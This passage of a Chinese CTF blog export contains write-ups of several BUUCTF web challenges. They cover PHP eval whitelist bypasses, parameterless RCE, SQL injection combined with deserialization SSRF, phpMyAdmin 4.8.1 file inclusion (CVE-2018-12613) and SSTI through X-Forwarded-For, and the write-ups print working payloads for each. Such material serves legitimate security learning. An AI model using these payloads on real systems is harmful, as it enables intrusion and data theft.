preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：白名单里有些函数</p>
<h5 id="base-convert函数"><a href="#base-convert函数" class="headerlink" title="base_convert函数"></a><strong>base_convert</strong>函数<img src="/2021/07/30/buu/4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc3NodDA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></h5><h5 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h5><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
<h5 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex() 函数"></a>dechex() 函数</h5><p>dechex() 函数把十进制数转换为十六进制数。</p>
<p>目标：执行system函数来完成查看flag的操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;system(&quot;cat &#x2F;flag&quot;)</span><br></pre></td></tr></table></figure>

<p>但是上面列出来白名单和黑名单，关键字符会被过滤，要求我们绕过。</p>
<p>比如这样就是被过滤了：</p>
<p><img src="/2021/07/30/buu/4/image-20210802091253839.png" alt="image-20210802091253839"></p>
<p>我们不能输入引号和system函数</p>
<p>但引号去掉也可执行，然后再采用变量保存函数和参数。</p>
<p>且用白名单里的函数代替得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<p>不过，_GET并没有在白名单内,[ ]也被过滤。</p>
<p>所以</p>
<p>1.[ ]可以用{}替换</p>
<p>2._GET用hex2bin转换</p>
<p><a href="https://www.rapidtables.org/zh-CN/convert/number/ascii-to-hex.html">ASCII到十六进制| 文本到十六进制代码转换器 (rapidtables.org)</a></p>
<p><img src="/2021/07/30/buu/4/image-20210802092247741.png" alt="image-20210802092247741"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)</span><br></pre></td></tr></table></figure>

<p>  这里用到的hex2bin也是名单之外</p>
<p>  需要用base_convert函数转换</p>
<p>（用base_convert()函数将10进制数转化为32进制的hex2bin）</p>
<p><a href="https://tool.oschina.net/hexconvert">在线进制转换 (oschina.net)</a></p>
<p><img src="/2021/07/30/buu/4/image-20210802092841841.png" alt="image-20210802092841841"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hex2bin&#x3D;base_convert(37907361743,10,36)</span><br></pre></td></tr></table></figure>

<p>数字也不能直接填</p>
<p>因为之前的正则表达式会过滤掉。</p>
<p><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> 这句话当作函数名放进白名单里检测</p>
<p>所以<code>5f 47 45 54</code>需要转换</p>
<p>而dechex() 函数把十进制数转换为十六进制数。</p>
<p><img src="/2021/07/30/buu/4/image-20210802093324856.png" alt="image-20210802093324856"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5f474554&#x3D;dechex(1598506324)</span><br></pre></td></tr></table></figure>

<p>所以有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)&#x3D;base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure>

<p>接着将_GET存在一个变量里：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/30/buu/4/image-20210802094315328.png" alt="image-20210802094315328"></p>
<p>本文章参考于：(<a href="https://blog.csdn.net/missht0/article/details/113244707">https://blog.csdn.net/missht0/article/details/113244707</a>)</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 禁止套娃</title>
    <url>/2021/08/01/buu/5/</url>
    <content><![CDATA[<p>​    靶机启动：</p>
<p><img src="/2021/08/01/buu/5/image-20210801193338875.png" alt="image-20210801193338875"></p>
<p>查看了源码无果，又试了一下index.php、robots协议之类的也不行，御剑没有扫描出来</p>
<p>查看了wp才知道这是git泄露。</p>
<h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><h4 id="简述-git文件导致的源码泄露"><a href="#简述-git文件导致的源码泄露" class="headerlink" title="简述.git文件导致的源码泄露"></a>简述.git文件导致的源码泄露</h4><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。</p>
<h4 id="原理利用"><a href="#原理利用" class="headerlink" title="原理利用"></a>原理利用</h4><p>1、通常开发人员在开发时，通常将源码提交到远程的托管网站（如Github）方便管理与交互，等到开发最后阶段，再将源码从远程服务器上下载到 web 目录下， 如果开发人员忘记将其中的 .git文件删除，则可以通过 .git文件恢复网站源码，来获取一些敏感信息；<br>2、开发人员对站点使用 Git 对版本进行控制，实现自动部署，如果配置不当，直接将 .git文件加载到线上环境，这样便引起了.git文件泄露。</p>
<p>这时候我们用了名为GitHack的工具</p>
<p>(需要python版本为2打头的，因为作者写的时候估计python解释器是参考python2的所以用python3会报错,下载地址为：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</p>
<p>进行了扫描，获取源文件：</p>
<p><img src="/2021/08/01/buu/5/image-20210801194006477.png" alt="image-20210801194006477"></p>
<p><img src="/2021/08/01/buu/5/image-20210801194541670.png" alt="image-20210801194541670"></p>
<p>源码如下：</p>
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>

<p>我们的最终目的就是绕过之后通过eval函数来查询flag。</p>
<p>源码分析：</p>
<ul>
<li>需要通过<strong>GET</strong>方式传入参数<code>exp</code></li>
<li>第一层<code>preg_match()</code>函数限制了php伪协议，像封装协议之类的</li>
<li>第二层<code>preg_replace()</code>正则表达式匹配，<code>(?R)</code>表示引用当前表达式，只能匹配通过无参数的函数。</li>
<li>第三层<code>preg_match()</code>限制了一些关键字</li>
<li><code>@eval($_GET[&#39;exp&#39;]);</code>可以进行命令执行；典型的无参数RCE</li>
<li>虽然其不能使用php伪协议，但是@eval($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录：</li>
</ul>
<p><img src="/2021/08/01/buu/5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>第二层正则表达式无法给directory参数赋值，所以查找能够返回为’.’结果的函数；</p>
<p>首先需要得到当前目录下的文件<br>scandir()函数可以扫描当前目录下的文件，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>那么问题就是如何构造<br>scandir(‘.’)</p>
<p>这里再看函数：</p>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.<br>current() 返回数组中的当前单元, 默认取第一个值。<br>pos()是 current() 的别名。<br>这里还有一个知识点：</p>
<p><strong>current(localeconv())永远都是个点</strong></p>
<p>构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/buu/5/image-20210801200909285.png" alt="image-20210801200909285"></p>
<p>到这里我们也只是可以知道flag.php的存在</p>
<p>却还不能读取它的源码</p>
<p><img src="/2021/08/01/buu/5/1625650-20200204202458447-503722062.png" alt="img"></p>
<p>从上图的官方解释中可以知道</p>
<p>我们无法用单独的函数读取源码</p>
<p><strong>1.array_reverse()</strong><br>以相反的元素顺序返回数组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p><strong>2.array_flip()</strong></p>
<p>交换数组的键和值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_flip(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>

<p><strong>3.array_rand()</strong></p>
<p>从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;print_r(readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));    </span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/buu/5/image-20210801202551668.png" alt="image-20210801202551668"></p>
<p>参考博客：</p>
<p> <a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
<p> <a href="https://blog.csdn.net/weixin_44037296/article/details/111404335">GXYCTF2019] 禁止套娃_Senimo-CSDN博客_buuctf 禁止套娃</a></p>
<p> <a href="https://blog.csdn.net/rfrder/article/details/109627827">GXYCTF2019]禁止套娃 1_feng的博客-CSDN博客</a></p>
<h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>学长用这题做模板，做了改造题</p>
<p>本来以为很简单(好吧其实是很简单)</p>
<p>先用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>



<p><img src="/2021/08/01/buu/5/image-20210827201807385.png" alt="image-20210827201807385"></p>
<p>再直接读取（我就是傻傻一直不读读取的孩子啊，在那array_reverse，哭死了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show_source(this_is_real_flag);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/buu/5/image-20210827201914618.png" alt="image-20210827201914618"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2018 Fakebook</title>
    <url>/2021/08/02/buu/6/</url>
    <content><![CDATA[<h4 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h4><p>先纪念一下啊，调试了好长一段时间才成功的扫描工具<strong>dirsearch</strong></p>
<p>总结运行成功的几个条件：</p>
<p>1.安装python版本3.7及以上，且要确保cmd命令行内默认版本正确（因为之前我为了使用GitHack而更改了python解释器）。</p>
<p>2.遇到如下报错时：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;D:\dirsearch\dirsearch.py&quot;, line 28, in &lt;module&gt;</span><br><span class="line">    from lib.controller.controller import Controller</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .controller import Controller  # noqa: F401</span><br><span class="line">  File &quot;D:\dirsearch\lib\controller\controller.py&quot;, line 29, in &lt;module&gt;</span><br><span class="line">    from lib.connection.requester import Requester</span><br><span class="line">  File &quot;D:\dirsearch\lib\connection\requester.py&quot;, line 30, in &lt;module&gt;</span><br><span class="line">    from thirdparty.requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .requests_ntlm import HttpNtlmAuth</span><br><span class="line">  File &quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;, line 5, in &lt;module&gt;</span><br><span class="line">    from cryptography import x509</span><br><span class="line">ModuleNotFoundError: No module named &#39;cryptography&#39;</span><br></pre></td></tr></table></figure>

<p>说明库没装上，可以去pycharm里自行安装完整。</p>
<p>附上图:</p>
<p><img src="/2021/08/02/buu/6/image-20210802195925831.png"></p>
<p><img src="/2021/08/02/buu/6/image-20210802200037618.png"></p>
<p><img src="/2021/08/02/buu/6/image-20210802200638164.png"></p>
<p>dirseach自带的字典在db目录下，使用格式以及常用参数如下：<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p>
<p><strong>-<code>u后面跟要扫的url</code></strong></p>
<p><strong>-<code>e是指定的url</code></strong></p>
<p><strong>-<code>w是指定字典</code></strong></p>
<p><strong>-<code>r递归目录</code></strong></p>
<p><strong>-<code>random</code>-agents使用随机UA</strong></p>
<p>还可以调低线程：dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429</p>
<hr>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>打开后注册（join）进入·页面</p>
<p><img src="/2021/08/02/buu/6/image-20210803144611777.png" alt="image-20210803144611777"></p>
<p>点击后</p>
<p>发现了注入点：</p>
<p><img src="/2021/08/02/buu/6/image-20210803144818019.png" alt="image-20210803144818019"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**Notice**:  unserialize(): Error at offset 0 of 1 bytes in **&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php** on line **31**</span><br></pre></td></tr></table></figure>

<p>页面左上方提示了本题实际与序列化有关</p>
<p>查看wp知道了要用dirsearch扫描目录获取源文件</p>
<p>如下图状态码回响200时，出现了robots协议</p>
<p><img src="/2021/08/02/buu/6/image-20210802200638164.png" alt="image-20210802200638164"></p>
<p>按照提示访问下载user.php.bak</p>
<p><img src="/2021/08/02/buu/6/image-20210802200728401.png" alt="image-20210802200728401"></p>
<p>重命名为user.php,源打开代码：</p>
<p><img src="/2021/08/02/buu/6/image-20210802200825525.png" alt="image-20210802200825525"></p>
<h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p><img src="/2021/08/02/buu/6/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h5 id="摘抄："><a href="#摘抄：" class="headerlink" title="摘抄："></a>摘抄：</h5><p>*<em>【</em>】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。**</p>
<p>*<em>【</em>】curl_setopt ： 请求一个url。**<br><strong>其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</strong></p>
<p>*<em>【</em>】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。**</p>
<p>*<em>【</em>】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。**</p>
<p>*<em>【</em>】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。**<br><strong>curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</strong></p>
<p><strong>如果状态码不是404，就返回exec的结果。</strong></p>
<p><img src="/2021/08/02/buu/6/20200420141747970.png" alt="在这里插入图片描述"></p>
<p><strong>这里说明了传的参数是blog</strong></p>
<p>通过分析，我们知道了这题涉及反序列化和ssrf</p>
<h5 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h5><p>我先继续爆破</p>
<p><img src="/2021/08/02/buu/6/image-20210803145941495.png" alt="image-20210803145941495"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,database(),3,4#</span><br></pre></td></tr></table></figure>

<p>得到数据库名：fakebook</p>
<p><img src="/2021/08/02/buu/6/image-20210803151032215.png" alt="image-20210803151032215"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;#</span><br></pre></td></tr></table></figure>

<p>得到表名：users</p>
<p><img src="/2021/08/02/buu/6/image-20210803151215574.png" alt="image-20210803151215574"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure>

<p>得到列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</p>
<p><img src="/2021/08/02/buu/6/image-20210803151357937.png" alt="image-20210803151357937"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F; select 1,data,3,4 from users#</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1 union&#x2F;**&#x2F;select 1,group_concat(no,username,passwd,data),3,4 from fakebook.users#</span><br></pre></td></tr></table></figure>

<p>当试到data时，出现了我们想要的部分序列化数据格式</p>
<p>O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:1;s:4:”blog”;s:13:”<a href="http://www.baidu.com&quot;;}/">www.baidu.com&quot;;}</a>            </p>
<p>这时候回到源代码上</p>
<p>我们来一手反序列化操作：</p>
<p>注：文件路径是扫描到的。</p>
<p><img src="/2021/08/02/buu/6/image-20210803153246831.png" alt="image-20210803153246831"></p>
<p>在本地www访问fakebook.php</p>
<p><img src="/2021/08/02/buu/6/image-20210803153215829.png" alt="image-20210803153215829"></p>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F; select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/02/buu/6/image-20210803153757132.png" alt="image-20210803153757132"></p>
<p><img src="/2021/08/02/buu/6/image-20210803153814758.png" alt="image-20210803153814758"></p>
<p><img src="/2021/08/02/buu/6/image-20210803153834055.png" alt="image-20210803153834055"></p>
<p>本文借鉴几个大佬博客：</p>
<p><a href="https://blog.csdn.net/qq_43622442/article/details/105633194">网鼎杯 2018]Fakebook_H9_dawn的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/karsa/p/12652311.html">网鼎杯 2018]Fakebook - kar3a - 博客园 (cnblogs.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1682583">网鼎杯2018-Fakebook - 云+社区 - 腾讯云 (tencent.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 我有一个数据库&amp;BJDCTF2020 The mystery of ip</title>
    <url>/2021/08/03/buu/7/</url>
    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>打开页面，奇怪的乱码：</p>
<p><img src="/2021/08/03/buu/7/image-20210803200638733.png" alt="image-20210803200638733"></p>
<p>找了一个乱码恢复页面：<a href="http://www.mytju.com/classcode/tools/messycoderecover.asp">乱码恢复 (mytju.com)</a></p>
<p><img src="/2021/08/03/buu/7/image-20210803200740870.png" alt="image-20210803200740870"></p>
<p>在utf8格式下，只得到了无用信息：空的数据?我有一个数据库，但里面什么也没有~不信你找</p>
<p>在f12也不行后，我果断地拿起来神器——dirsearch！</p>
<p>一通扫描后果然有了眉目：</p>
<p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(356).png"></p>
<p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(357).png"></p>
<p>进入到<a href="http://e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn/phpmyadmin/index.php">e8451be4-2c39-421e-888a-2f04ad6a6de6.node4.buuoj.cn / mysql | phpMyAdmin 4.8.1</a></p>
<p><img src="/2021/08/03/buu/7/image-20210803201030523.png" alt="image-20210803201030523"></p>
<p>熟悉的phpmyadmin数据库页面</p>
<p>但是到了这里我就懵了，因为没有足够权限好像查不到flag在哪</p>
<p>查看了wp</p>
<p>原来这个版本漏洞可以利用，PhpMyadmin后台文件包含漏洞</p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">【首发】phpmyadmin4.8.1后台getshell (qq.com)</a></p>
<p><a href="https://www.jianshu.com/p/fb9c2ae16d09">cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)</a></p>
<p>​    index.php中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include $_REQUEST[&#39;target&#39;];</span><br></pre></td></tr></table></figure>

<p>利用参数target</p>
<p>相关poc从参考文章中可知</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;</span><br></pre></td></tr></table></figure>

<p>经过尝试发现，读取时可以尽量多下几级（多../../）无影响，反之若少了则会报错</p>
<p>如下图</p>
<p><img src="/2021/08/03/buu/7/image-20210803202146319.png" alt="image-20210803202146319"></p>
<p><img src="/2021/08/03/buu/7/image-20210803202211040.png" alt="image-20210803202211040"></p>
<h5 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h5><p>另外还有一种解法，来自于上面的 ’首发‘ 链接</p>
<p>将一句话木马写入数据库，然后在文件包含漏洞使之成功访问，蚁剑连接。</p>
<p>参考博客：</p>
<p><a href="https://blog.csdn.net/SopRomeo/article/details/105536972">GWCTF 2019]我有一个数据库_SopRomeo的博客-CSDN博客</a></p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2021/08/03/buu/7/image-20210804210338451.png" alt="image-20210804210338451"></p>
<p>分别查看Flag、Hint</p>
<p><img src="/2021/08/03/buu/7/image-20210804211511008.png" alt="image-20210804211511008"></p>
<p><img src="/2021/08/03/buu/7/image-20210804210443630.png" alt="image-20210804210443630"></p>
<p>看了源码，没有什么可以利用信息</p>
<p>查看wp，知道了标题的ip有所指</p>
<p>我们的ip能够被获取，怀疑是与XFF有关</p>
<p>接着我们进入火狐验证想法</p>
<p>添加X-Forwarded-For:127.0.0.1</p>
<p><img src="/2021/08/03/buu/7/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(366).png" alt="屏幕截图(366)"></p>
<p>看到回显显示：Your IP is : 127.0.0.1</p>
<p>说明了想法正确</p>
<p>利用模板注入</p>
<p><img src="/2021/08/03/buu/7/image-20210804211235273.png" alt="image-20210804211235273"></p>
<p><img src="/2021/08/03/buu/7/image-20210804211318879.png" alt="image-20210804211318879"></p>
<h5 id="知识点：SSTI模板注入"><a href="#知识点：SSTI模板注入" class="headerlink" title="知识点：SSTI模板注入"></a>知识点：SSTI模板注入</h5><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p>
<p><img src="/2021/08/03/buu/7/1625650-20200216204049347-1844990197.png" alt="img"></p>
<p>模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程<br>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/fightte/article/details/117003439">BJDCTF2020]The mystery of ip_fightte的博客-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12318630.html">BJDCTF2020]The mystery of ip - 王叹之 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 ZJCTF，不过如此</title>
    <url>/2021/08/06/buu/8/</url>
    <content><![CDATA[<h3 id="0x00-知识点"><a href="#0x00-知识点" class="headerlink" title="0x00 知识点"></a>0x00 知识点</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contents函数把整个文件读入一个字符串中。</p>
<h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><p>file_get_contents(path,include_path,context,start,max_length)</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">path</td>
<td align="left">必需。规定要读取的文件。</td>
</tr>
<tr>
<td align="left">include_path</td>
<td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td>
</tr>
<tr>
<td align="left">context</td>
<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
</tr>
<tr>
<td align="left">start</td>
<td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td>
</tr>
<tr>
<td align="left">max_length</td>
<td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td>
</tr>
</tbody></table>
<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This is a test file with test text.</span><br></pre></td></tr></table></figure>

<h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a href="https://www.cnblogs.com/soundcode/p/4572251.html">text/html与text/plain有什么区别？ - 左正 - 博客园 (cnblogs.com)</a></p>
<p>text/plain的意思是将文件设置为纯文本的形式，浏览器在获取到这种文件时并不会对其进行处理。</p>
<h4 id="PHP伪协议中的data-协议"><a href="#PHP伪协议中的data-协议" class="headerlink" title="PHP伪协议中的data://协议"></a>PHP伪协议中的data://协议</h4><p>摘抄于：<a href="https://blog.csdn.net/qq_46091464/article/details/106665358">文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客</a></p>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;include.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$file  &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    @include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload1：</p>
